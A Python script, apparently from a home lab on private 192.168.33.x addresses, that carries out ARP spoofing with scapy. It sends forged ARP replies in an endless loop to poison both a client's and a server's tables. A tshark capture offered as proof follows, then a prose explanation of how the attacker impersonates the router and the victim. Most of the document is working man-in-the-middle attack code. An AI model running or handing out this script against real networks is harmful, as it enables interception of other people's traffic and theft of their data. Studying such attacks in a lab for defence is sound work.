#!/usr/bin/env python
import time
import sys
import scapy.all as scapy

attacker_ip="192.168.33.10"
client_ip="192.168.33.30"
server_ip="192.168.33.20"

attacker_mac="52:54:00:4A:53:CB"
client_mac="52:54:00:2B:77:E0"
server_mac="52:54:00:55:E6:FF"

def get_mac(ip): # not used
    # creating an ARP request to the ip address
    arp_request = scapy.ARP(pdst=ip)
    # setting the destination MAC address to broadcast MAC
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # combining the ARP packet with the broadcast message
    arp_request_broadcast = broadcast / arp_request

    # return a list of MAC addresses with respective
    # MAC addresses and IP addresses.
    answ = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    # we choose the first MAC address and select
    # the MAC address using the field hwsrc
    return answ[0][1].hwsrc

def arp_spoof(target_ip, spoof_ip, mac_adr):
    # Here the ARP packet is set to response and
    # pdst is set to the target IP
    # either it is for victim or router and the hwdst
    # is the MAC address of the IP provided
    # and the psrc is the spoofing ip address
    # to manipulate the packet
    packet = scapy.ARP(op=2, pdst=target_ip,hwdst=mac_adr, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

victim_ip = client_ip # taking the victim ip_address
router_ip = server_ip # taking the router ip address
sent_packets_count = 0 # initializing the packet counter

while True:
    sent_packets_count += 2
    arp_spoof(victim_ip, router_ip, client_mac) #send to server
    arp_spoof(router_ip, victim_ip, server_mac) #send to 
    print("[+] Packets sent " + str(sent_packets_count), end="\r")
    sys.stdout.flush()
    time.sleep(2)

'''
Proof:
(10 is my ip ^^)

 126 20.031816244 RealtekU_2b:77:e0 → RealtekU_c1:15:8c ARP 42 192.168.33.30 is at 52:54:00:2b:77:e0
  132 22.031310306 RealtekU_c1:15:8c → RealtekU_55:e6:ff ARP 42 Who has 192.168.33.20? Tell 192.168.33.10
alpine38:~$ sudo tshark -i eth1 -Y arp 

'''
'''The ARP spoofing is the technique to fool a computer or a device which accepts the ARP response packets even though the device does not request it. 
As the device accepts the response packet without its knowledge, we can easily mess up with the hack and the hacker takes the advantage of this by sending a modified ARP response packet which contains the modified MAC address of the client with the hacker’s IP address to the router to fool and then simultaneously send the same ARP response packet to the victim saying that I am router. 
To achieve this attack the hacker sends an ARP response packet to the victim saying that “I am the router with the MAC address (hacker machine address) “and at the same time the hacker sends the same ARP response packet to the router saying that “I am the victim with this MAC address (hacker machine MAC address). Due to ARP request the victim and router will modify their network tables with the respective MAC address provided by the hacker. '''
